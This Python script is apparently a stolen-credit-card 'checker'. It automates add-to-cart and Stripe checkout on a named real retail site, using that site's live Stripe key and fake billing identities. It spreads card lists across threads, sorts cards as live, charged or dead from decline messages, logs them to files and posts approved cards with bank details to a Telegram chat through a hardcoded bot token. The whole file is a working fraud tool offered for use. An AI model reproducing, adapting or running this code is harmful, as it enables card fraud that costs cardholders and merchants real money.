import string
import random
import os
import time
import requests
import queue
import uuid
import re
import concurrent.futures
import csv
import telegram
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
import json
import rich
import threading

try:
    import requests, os, rich, datetime, time
except ModuleNotFoundError:
    os.system('pip install requests')
    os.system('pip install rich')
    os.system('pip install time')
    os.system('clear')

    
entry = """\n_summary_

    Returns:
        __type__: PYCHECKER
        __authors__: vibey raw shino
        __gate__: Woocommerce (STRIPE)
        __charge__: 21.90€
        __checks__: CCN BUT ALWAYS DEPEND ON SITE SOMES ARE CVV
        __networks__: VISA,DISCOVER,MASTER,AMEX
        __3D__: False
"""


rich.print(entry)


#SSL ERROR FIXED
import urllib3
urllib3.disable_warnings()


ap_usr = "https://random-data-api.com/api/v2/users"

res = requests.get(ap_usr)




names = res.json()['username']

first = res.json()['first_name']

last = res.json()['last_name']

        
domain = ['@gmail.com','@outlook.com']



def generate_mail():
   
   for i in domain:
    i = random.choice(domain)

   return ''.join(names)+i



def generate_number(length):

    phone = string.digits
    return ''.join(random.choice(phone) for _ in range(length))


    
        
email = generate_mail()
number = generate_number(length=10)

def generate_guid():
    return str(uuid.uuid4())

guid = generate_guid()
muid = generate_guid()
sid = generate_guid()
session_id = generate_guid()



# Create a dictionary to store the bin information

# Function to retrieve bin information

# Example usage:







bin_info_dict = {}




def cc_check(ccn, month, year, cvv):
    # Initialize the bin_info_dict as an empty dictionary
    bin_info_dict = {}
    print(ccn)

    def get_bin_info(ccn):
        if ccn[:6] in bin_info_dict:
            return bin_info_dict[ccn[:6]]
        else:
            return None
        
    with open('bins.csv', mode='r', encoding='utf-8') as file:
        csv_reader = csv.DictReader(file)  # Correct the indentation
        for row in csv_reader:
            bin_info = {
                'Vendor': row['vendor'],
                'Type': row['type'],
                'Level': row['level'],
                'flag': row['flag'],
                'Bank name': row['bank_name'],
                'Country': row['country']
            }
            bin_info_dict[row['number'][:6]] = bin_info


        
            
    s = requests.Session()
    start_time = time.time()

    url = "https://www.oceansapart.com/en/product/michelle-thong-fire-orange/" # 1ST ENDPOINT # AUTOMATE THE SESSION
    headers = {
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'Upgrade-Insecure-Requests': '1',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryQHBNdEBByscRdtV4',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.79',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'host': 'www.oceansapart.com', # ADD SITE HOST

    }

    payload = '''
------WebKitFormBoundaryQHBNdEBByscRdtV4
Content-Disposition: form-data; name="attribute_pa_size"

xs
------WebKitFormBoundaryQHBNdEBByscRdtV4
Content-Disposition: form-data; name="quantity"

1
------WebKitFormBoundaryQHBNdEBByscRdtV4
Content-Disposition: form-data; name="gtm4wp_id"

44651-fire-orange
------WebKitFormBoundaryQHBNdEBByscRdtV4
Content-Disposition: form-data; name="gtm4wp_name"

Michelle Thong<span class="product-subname"> <span class="hyphen-separator">-</span> Fire Orange</span>
------WebKitFormBoundaryQHBNdEBByscRdtV4
Content-Disposition: form-data; name="gtm4wp_sku"

44651-fire-orange
------WebKitFormBoundaryQHBNdEBByscRdtV4
Content-Disposition: form-data; name="gtm4wp_category"

Underwear/Panties
------WebKitFormBoundaryQHBNdEBByscRdtV4
Content-Disposition: form-data; name="gtm4wp_price"

15
------WebKitFormBoundaryQHBNdEBByscRdtV4
Content-Disposition: form-data; name="gtm4wp_stocklevel"


------WebKitFormBoundaryQHBNdEBByscRdtV4
Content-Disposition: form-data; name="add-to-cart"

3835501
------WebKitFormBoundaryQHBNdEBByscRdtV4
Content-Disposition: form-data; name="product_id"

3835501
------WebKitFormBoundaryQHBNdEBByscRdtV4
Content-Disposition: form-data; name="variation_id"

3835502
------WebKitFormBoundaryQHBNdEBByscRdtV4--
'''


    response = s.post(url, data=payload,headers=headers)
    
 
    cookie = s.cookies.get_dict()
    
    #rich.print(cookie)
    
    
    ch = cookie['woocommerce_cart_hash']

    sbp = cookie['_sbp']
    
   # wh = cookie['woodmart_wishlist_hash']
    
   # login = cookie['wordpress_logged_in_SITE ID']
    
    ses = cookie['wp_woocommerce_session_97f2b243cbb5d86887728a8da31ac051']

    awsalb = cookie['AWSALB']

    awsalbcors = cookie['AWSALBCORS']

    #print(ses)
    
    
    
   # print(login)

    
    urlx = 'https://www.oceansapart.com/en/cart/'

# Define the user agent (you can replace this with your actual user agent)
    headers = {
    'authority': 'www.oceansapart.com',
    'method': 'GET',
    'path': '/en/cart/',
    'scheme': 'https',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.8',
    'Cookie': f'sbp={sbp}; wp_woocommerce_session_97f2b243cbb5d86887728a8da31ac051={ses}; woocommerce_items_in_cart=1; woocommerce_cart_hash={ch}; AWSALB={awsalb}; AWSALBCORS={awsalbcors}',
    'Referer': 'https://www.oceansapart.com/en/product/michelle-thong-fire-orange/',
    'Sec-Ch-Ua': '"Brave";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Sec-Gpc': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36'
}

    # Perform the GET request with headers
    response = s.get(urlx, headers=headers)

    #print(response.text)

    # Check if the GET request was successful
    if response.status_code == 200:
        Checkout = response.text
    else:
        print(f"GET request failed with status code {response.status_code}")
        Checkout = None

    # Extract the CheckoutNonce using regular expressions
    pattern = r'"checkout":"(.*?)"'
    matches = re.search(pattern, Checkout)

    if matches:
        nonce = matches.group(1).strip()
        print("nonce:", nonce)
    else:
        print("nonce not found in the response")

    # Replace these values with your actual data

    
    
    url_2 = 'https://api.stripe.com/v1/sources'  # 2nd ENDPOINT


    header_2 = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'pragma': 'no-cache',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.79',
    }
    
    

    data_2 = f'type=card&owner[name]={first}+{last}&owner[address][line1]=jj+street&owner[address][city]=new+york&owner[address][postal_code]=WF4+4LG&owner[address][country]=GB&owner[email]={email}&owner[phone]=9955447788&card[number]={ccn}&card[cvc]={cvv}&card[exp_month]={month}&card[exp_year]={year}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F17cd88d5df%3B+stripe-js-v3%2F17cd88d5df%3B+split-card-element&referrer=https%3A%2F%2Fwww.oceansapart.com&time_on_page=89588&key=pk_live_EFBvdxxHxss6emuqKbbex9PO' # INSERT CLIENT KEY (PK)

    response = requests.post(url=url_2, headers=header_2, data=data_2)

    # Check if the POST request was successful
    if response.status_code == 200:
        # Parse the JSON response
        data = response.json()
        print(data)
        # Extract the "id" value
        id = data.get('id')
        #print("Payment ID:", id)
    else:
        print(f"POST request failed with status code {response.status_code}")


    url_3 = "https://www.oceansapart.com/en/?wc-ajax=checkout" # 3rd ENDPOINT

    headers3 = {
    'authority': 'www.oceansapart.com',
    'method': 'POST',
    'path': '/en/?wc-ajax=checkout',
    'scheme': 'https',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.8',
    'Content-Length': '633',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Cookie': f'sbp={sbp}; wp_woocommerce_session_97f2b243cbb5d86887728a8da31ac051={ses}; woocommerce_items_in_cart=1; woocommerce_cart_hash={ch}; AWSALB={awsalb}; AWSALBCORS={awsalbcors}',
    'Origin': 'https://www.oceansapart.com',
    'Referer': 'https://www.oceansapart.com/en/checkout/',
    'Sec-Ch-Ua': '"Brave";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Gpc': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest'
}

    # Create a dictionary with your data
    data = {
    'billing_first_name': {first},
    'billing_last_name': {last},
    'billing_email': {email},
    'billing_company': '',
    'billing_phone': '9955447788',
    'billing_country': 'GB',
    'billing_address_1': 'jj street',
    'billing_address_2': '',
    'billing_postcode': 'WF4 4LG',
    'billing_city': 'new york',
    'billing_state': '',
    'shipping_first_name': '',
    'shipping_last_name': '',
    'shipping_company': '',
    'shipping_country': 'AT',
    'shipping_address_1': '',
    'shipping_address_2': '',
    'shipping_postcode': '',
    'shipping_city': '',
    'shipping_state': '',
    'shipping_method[0]': 'flat_rate:73',
    'payment_method': 'stripe',
    'woocommerce-process-checkout-nonce': {nonce},
    '_wp_http_referer': '/en/?wc-ajax=update_order_review',
    'stripe_source': {id}
}


    # Make the POST request with JSON data
    response_2 = s.post(url_3, headers=headers3, data=data)
    end_time = time.time()
    elapsed_time = end_time - start_time
    formatted_time = f"{elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"

    # Print the response content
    #print(response_2.text)



    send = {}
    if "The card's security code is incorrect." in response_2.text:
        live = []
        ccnd = f"{ccn}|{month}|{year}|{cvv}".strip()
        result = "Security code is incorrect"
        send = {
    'condition': True  # Set the condition to True if you want to send the message
}

        rich.print(f"\n LIVE : {ccnd} {response_2.text}\n")
        live.append(ccnd)
        
        for live_cc in live:
            with open("live.txt","a",encoding="utf-8")as dead_ccs:
                dead_ccs.write(f"🟢 LIVE : {ccnd} {response_2.text}\n\n")


    elif "Your card has insufficient funds" in response_2.text:
        live = []
        ccnd = f"{ccn}|{month}|{year}|{cvv}".strip()
        result = "Your card has insufficient funds"
        rich.print(f"\n LIVE : {ccnd} {response_2.text}\n")
        send = {
    'condition': True  # Set the condition to True if you want to send the message
}
        live.append(ccnd)
        
        for live_cc in live:
            with open("live.txt","a",encoding="utf-8")as dead_ccs:
                dead_ccs.write(f"🟢 LIVE : {ccnd} {response_2.text}\n\n")

    elif "Your card does not support this type of purchase." in response_2.text:
        live = []
        ccnd = f"{ccn}|{month}|{year}|{cvv}".strip()
        result = "Your card does not support this type of purchase."
        send = {
    'condition': True  # Set the condition to True if you want to send the message
}

        rich.print(f"\n LIVE : {ccnd} {response_2.text}\n")
        live.append(ccnd)
        
        for live_cc in live:
            with open("live.txt","a",encoding="utf-8")as dead_ccs:
                dead_ccs.write(f"🟢 LIVE : {ccnd} {response_2.text}\n\n")


    elif "security_code_incorrect" in response_2.text:
        live = []
        ccnd = f"{ccn}|{month}|{year}|{cvv}".strip()
        result = "Security code is incorrect."
        send = {
    'condition': True  # Set the condition to True if you want to send the message
}

        rich.print(f"\n LIVE : {ccnd} {response_2.text}\n")
        live.append(ccnd)
        
        for live_cc in live:
            with open("live.txt","a",encoding="utf-8")as dead_ccs:
                dead_ccs.write(f"🟢 LIVE : {ccnd} {response_2.text}\n\n")


    elif "invalid_cvc" in response_2.text:
        live = []
        ccnd = f"{ccn}|{month}|{year}|{cvv}".strip()
        result = "invalid_cvc"
        send = {
    'condition': True  # Set the condition to True if you want to send the message
}

        rich.print(f"\n LIVE : {ccnd} {response_2.text}\n")
        live.append(ccnd)
        
        for live_cc in live:
            with open("live.txt","a",encoding="utf-8")as dead_ccs:
                dead_ccs.write(f"🟢 LIVE : {ccnd} {response_2.text}\n\n")
                
    elif "The card's security code is invalid." in response_2.text:
        live = []
        ccnd = f"{ccn}|{month}|{year}|{cvv}".strip()
        result = "security code is invalid."
        send = {
    'condition': True  # Set the condition to True if you want to send the message
}
        rich.print(f"\n LIVE : {ccnd} {response_2.text}\n")
        live.append(ccnd)
        
        for live_cc in live:
            with open("live.txt","a",encoding="utf-8")as dead_ccs:
                dead_ccs.write(f"🟢 LIVE : {ccnd} {response_2.text}\n\n")

    elif "Your card's security code is incorrect." in response_2.text:
        live = []
        ccnd = f"{ccn}|{month}|{year}|{cvv}".strip()
        result = "Your card's security code is incorrect"
        send = {
    'condition': True  # Set the condition to True if you want to send the message
}

        rich.print(f"\n LIVE : {ccnd} {response_2.text}\n")
        live.append(ccnd)
        
        for live_cc in live:
            with open("live.txt","a",encoding="utf-8")as dead_ccs:
                dead_ccs.write(f"🟢 LIVE : {ccnd} {response_2.text}\n\n")
            

    elif "redirect" in response_2.text:
        charge = []
        ccnd = f"{ccn}|{month}|{year}|{cvv}".strip()
        result = "21.90€ CHARGED"

        data = json.loads(response_2.text)

# Extract the desired portion of the "redirect" value
        redirect_value = data["redirect"]

    # Find the index of "-pi-pi"
        start_index = redirect_value.find("#confirm-pi-")

        # Find the index of ":"
        end_index = redirect_value.find(":")

        # Extract the portion between "-pi-pi" and ":"
        client_s = redirect_value[start_index + len("#confirm-pi-"):end_index]

        # Find the index of ":"
        end_index = redirect_value.find("_secret")

        # Extract the portion between "-pi-pi" and ":"
        pi = redirect_value[start_index + len("#confirm-pi"):end_index]
        
        print(pi)
        print(client_s)

        intents1 = f'https://api.stripe.com/v1/payment_intents/{pi}/confirm'  # 2nd ENDPOINT


        header_2 = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'pragma': 'no-cache',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.79',
        }
        
        
        data_2 = f'expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_EFBvdxxHxss6emuqKbbex9PO&client_secret={client_s}' # INSERT CLIENT KEY (PK)

        responsex1 = requests.post(url=intents1, headers=header_2, data=data_2)

        # Check if the POST request was successful
        if responsex1.status_code == 200:
            # Parse the JSON response
            data = responsex1.json()
            # Extract the "id" value
            print(data)
            src = data.get('three_d_secure_2_source')
            print("src:", src)
            
        else:
            print(f"POST request failed with status code {responsex1.status_code}")

        authenticate = 'https://api.stripe.com/v1/3ds2/authenticate'  # 2nd ENDPOINT


        header_2 = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'pragma': 'no-cache',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.79',
        }
        
        
        data_au = f'source={src}&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-US%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22860%22%2C%22browserScreenWidth%22%3A%221440%22%2C%22browserTZ%22%3A%22-330%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F117.0.0.0+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=false&one_click_authn_device_support[webauthn_eligible]=false&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=pk_live_EFBvdxxHxss6emuqKbbex9PO' # INSERT CLIENT KEY (PK)

        respo2 = requests.post(url=authenticate, headers=header_2, data=data_au)

        # Check if the POST request was successful
        if respo2.status_code == 200:
            # Parse the JSON response
            datax2 = respo2.json()
            # Extract the "id" value
            challenge = datax2.get('state')
            print("challenge:", challenge)
        else:
            print(f"POST request failed with status code {respo2.status_code}")

        intent2 = f'https://api.stripe.com/v1/payment_intents/{pi}?key=pk_live_EFBvdxxHxss6emuqKbbex9PO&is_stripe_sdk=false&client_secret={client_s}'  # 2nd ENDPOINT


        header_2x = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'pragma': 'no-cache',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.79',
        }
        
        
        data_i2 = f'key=pk_live_EFBvdxxHxss6emuqKbbex9PO&is_stripe_sdk=false&client_secret={client_s}' # INSERT CLIENT KEY (PK)

        respo3 = requests.get(url=intent2, headers=header_2x, data=data_i2)

        # Check if the POST request was successful
        if respo3.status_code == 200:
            # Parse the JSON response
            data3 = respo3.json()
            # Extract the "id" value
            message = data3.get('message')
            print("status:", message)
        else:
            print(f"POST request failed with status code {respo3.status_code}")
        
        if "order-recevied" in respo3.text or "success" in respo3.text :
            result = "21.90€ CHARGED"
            send = {
                'condition': True  
            }
        elif "We were unable to process your order" in respo3.text:
            result = "Insufficient Funds"
            send = {
                'condition': True  
            }
        elif "challenge_required" in respo2.text:
            result = "challenge_required"
            send = {
                'condition': False  
            }
        else:
            result = "Unknown response."
            send = {
                'condition': False  
            }

        rich.print(f"\n🔰 21.90€ CHARGE: {ccnd} {response_2.text}\n")
        
        charge.append(ccnd)
        
        for charge in charge:
            with open("charge.txt","a",encoding="utf-8")as dead_ccs:
                dead_ccs.write(f"🔰 21.90€ CHARGE: {ccnd} {response_2.text}\n\n")
           
                   
    elif "Sorry, your session has expired" in response_2.text:
        rich.print(f"\n🍪 EXPIRED : {response_2.text} \n")
        send = {
    'condition': False  # Set the condition to True if you want to send the message
}
         
    
    else: 
        dead = []
        ccnd = f"{ccn}|{month}|{year}|{cvv}".strip()
        rich.print(f"\n⭕ DEAD : {ccnd} {response_2.text} \n")
        dead.append(ccnd)
        send = {
    'condition': False  # Set the condition to True if you want to send the message
}

        for dead_cc in dead:
            with open("dead.txt","a",encoding="utf-8")as dead_ccs:
                dead_ccs.write(f"⭕ DEAD : {ccnd} {response_2.text} \n\n")



    bin_info = get_bin_info(ccn)

    if bin_info:
        # Store bin information in variables
        bin_var = ccn[:6]
        vendor_var = bin_info['Vendor']
        type_var = bin_info['Type']
        level_var = bin_info['Level']
        bank_name_var = bin_info['Bank name']
        country_var = bin_info['Country']
        flag = bin_info['flag']
    else:
        print("Bin information not found for the given CCN.")
        return

    # Your bot's token and chat ID
    bot_token = '6525917129:AAHRpiJO2_uqYir7TJJQXYnbDCuy4EsDuvI'
    chat_id = '5911292485'
    #chat_id = '-1001938977852'
    

    # List of available reactions
    reactions = [
        "airkiss", "angrystare", "bite", "bleh", "blush", "brofist", "celebrate", "cheers", "clap", "confused", "cool", "cry",
        "cuddle", "dance", "drool", "evillaugh", "facepalm", "handhold", "happy", "headbang", "hug", "kiss", "laugh", "lick",
        "love", "mad", "nervous", "no", "nom", "nosebleed", "nuzzle", "nyah", "pat", "peek", "pinch", "poke", "pout", "punch",
        "roll", "run", "sad", "scared", "shrug", "shy", "sigh", "sip", "slap", "sleep", "slowclap", "smack", "smile", "smug",
        "sneeze", "sorry", "stare", "stop", "surprised", "sweat", "thumbsup", "tickle", "tired", "wave", "wink", "woah", "yawn", "yay", "yes"
    ]

    # Check if the condition to send the message is True
    if send.get('condition', True):
        try:
            # Choose a random reaction from the list
            random_reaction = random.choice(reactions)

            # OtakuGIFs API endpoint to get a random anime GIF with the chosen reaction
            otaku_gifs_api_url = 'https://api.otakugifs.xyz/gif'
            otaku_gifs_params = {
                'reaction': random_reaction,
                'format': 'gif'
            }

            # Make a request to the OtakuGIFs API to get a random anime GIF with the chosen reaction
            response = requests.get(otaku_gifs_api_url, params=otaku_gifs_params)

            if response.status_code == 200:
                data = response.json()
                gif_url = data['url']

                # Initialize the bot
                bot = telegram.Bot(token=bot_token)

                # Create inline keyboard buttons
                inline_keyboard = [
                    [
                        InlineKeyboardButton("🌸 𝗢𝗪𝗡𝗘𝗥", url="https://t.me/Itz_Shinobu_Kocho"),
                        InlineKeyboardButton("🔮 𝗟𝗔𝗟𝗔𝗟𝗔𝗟𝗜𝗦𝗔", url="https://t.me/tokpmlist_bot")
                    ]
                ]

                # Create an InlineKeyboardMarkup object
                reply_markup = InlineKeyboardMarkup(inline_keyboard)

                # Send the GIF as an animation (sticker) with the caption and inline keyboard
                bot.send_animation(
                    chat_id=chat_id,
                    animation=gif_url,
                    caption=f"""**𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗** ✅
━━━━━━━━━━━━━━━━━━
💳 **𝗖𝗮𝗿𝗱:** `{ccnd}`
🚀 **𝗦𝘁𝗮𝘁𝘂𝘀:** {result}
🌐 **𝗚𝗮𝘁𝗲𝘄𝗮𝘆:** 21.90€ Woo+Stripe 
━━━━━━━━━━━━━━━━━━
**𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻:**
  ⩨ **𝗖𝗮𝗿𝗱 𝗧𝘆𝗽𝗲:** {vendor_var} - {type_var} - {level_var}
  ⩨ **𝗕𝗮𝗻𝗸:** {bank_name_var}
  ⩨ **𝗖𝗼𝘂𝗻𝘁𝗿𝘆:** {country_var} {flag}
━━━━━━━━━━━━━━━━━━
**𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻** ➜ `{formatted_time}`
**𝗣𝗿𝗼𝘅𝗶𝗲𝘀** ➜ `Off`
━━━━━━━━━━━━━━━━━━""",
                    parse_mode=telegram.ParseMode.MARKDOWN,
                    reply_markup=reply_markup
                )
            else:
                print("Failed to fetch a random anime GIF from OtakuGIFs API.")
        except Exception as e:
            print(f"An error occurred: {str(e)}")
        pass


def worker(work_queue):
    while True:
        try:
            ccn, month, year, cvv = work_queue.get(timeout=1)
            cc_check(ccn, month, year, cvv)
            work_queue.task_done()
        except queue.Empty:
            break

def main():
    while True:
        # Create a queue to hold unique credit card data
        unique_cc_data = set()

        # Open and process the cc.txt file
        with open("cc.txt") as cc_file:
            for line in cc_file:
                cc_data = line.strip().split('|')
                if len(cc_data) == 4:
                    ccn, month, year, cvv = cc_data
                    unique_cc_data.add((ccn, month, year, cvv))
                else:
                    print("Invalid cc format")

        # Create a queue to hold the work items
        work_queue = queue.Queue()

        # Populate the work queue with unique credit card data
        for cc_data in unique_cc_data:
            work_queue.put(cc_data)

        # Create 10 worker threads
        threads = []
        for _ in range(10):
            thread = threading.Thread(target=worker, args=(work_queue,))
            thread.start()
            threads.append(thread)

        # Wait for all worker threads to finish
        for thread in threads:
            thread.join()

        # Ask the user whether to restart or exit
        choice = input("Press 1 to restart or 2 to exit: ")
        if choice == "2":
            break

if __name__ == "__main__":
    main()
